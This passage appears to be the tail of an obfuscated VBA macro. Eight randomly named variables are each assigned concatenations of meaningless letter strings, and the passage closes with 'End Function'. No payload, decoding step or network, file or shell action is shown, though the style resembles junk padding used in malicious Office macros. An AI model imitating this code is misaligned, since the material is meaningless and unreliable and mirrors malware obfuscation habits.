rVzfuPcXQ = ("POIrBQOBR" + "srjMPkBYQndh" + "oCDJiAPYaTJ" + "wLrfjjmfGRA" + "kQKNEGcnioTpz" + "jABISYXl") + ("ZKthHqCTXC" + "YOpBTTrVt" + "rChbwldz" + "bRzwkDLZUwjVwm" + "iVLzpwjBrMhI" + "FKFYVXaz")
ZREwIuWYN = ("uPwtaadIBvPH" + "DvzTJrHAZMlJ" + "GBjDKci" + "msNMkiuMVfh" + "hBDIbMhFl" + "CMkWUcczlm") + ("JQCmHZMNnDh" + "rWEwXcz" + "YpRqAcNKRkYuun" + "lAWUnVswSV" + "sAQiFVnr" + "UwMmiMB")
vDfnIDwSz = ("IKZfrzU" + "jMunfCGDiDmok" + "aTwumiAoCzhEN" + "SZdzrvvzHIY" + "jFVujIQTjGi" + "MlquKwFapdlIan") + ("otbLoWKCuTHRZn" + "tLqjnFEAoLCznD" + "MTtLbZIuua" + "jvbCfjn" + "jZSuzrktmAmYWw" + "HoYNLVlQwGl")
VJZljVJsT = ("uZtUrfVuIBflVU" + "HSbZwIVnO" + "bUAUQOiffM" + "itTpPWoFF" + "oEXYDiSVmYli" + "QKUasmAFpHwcZH") + ("imhiJknPcvNj" + "KsniAuDf" + "vvTEfwzZwdaimA" + "DVOdusffFpvwT" + "bfEFnrlOEE" + "SDwjGcXszbffZ")
kCPQOPjBd = ("VwVdwJE" + "RJobohvwMXEWt" + "ziUkbVAoVnpzdl" + "zYjsnOVlIOiV" + "DLzGLYwrI" + "hjncoBmoD") + ("NMzUiGii" + "MWszllJpioEmt" + "KBIzljjWZiKBq" + "ccEqUzwr" + "kBqfLDAzXTWoT" + "GwzJpzOojv")
zNGjOSwuT = ("YwvBYSYf" + "iTXJGwtWoGubv" + "uiwzRkEXc" + "GzIBvlXYiB" + "bZEzlVw" + "nYldfATa") + ("HviKrCCJpr" + "CjWstRTJuzf" + "IPowVUcBc" + "BQnSqkWB" + "vdVFDCsjOhKjY" + "jauCGjoMqwr")
iFFbaimsG = ("lnKktdlOURfc" + "HswhQVCjmWNVz" + "HowYnSsunjRN" + "DwWhMFQ" + "jiAWXEAzQzPvrd" + "VtrKwMFMQCS") + ("lQpBPjnYKzBQNr" + "WmCRLaXBnUvUli" + "kTEGPiawz" + "DEQXrbwER" + "aNlHXNOBjUMB" + "sNiLHcMvqDCIWH")
dvtwPUvrX = ("ziCTZPiCBJXK" + "PpbEmjKj" + "BFlGmVwhzBqAOZ" + "sWaYzGMkTli" + "oPIHMwwj" + "iScJGUKVUJAPBM") + ("JmksoVSUI" + "IRqudCPs" + "JEzOtmCOzbd" + "mDszaNFsbQzUzz" + "TbqHlXY" + "MLXrFmH")
End Function
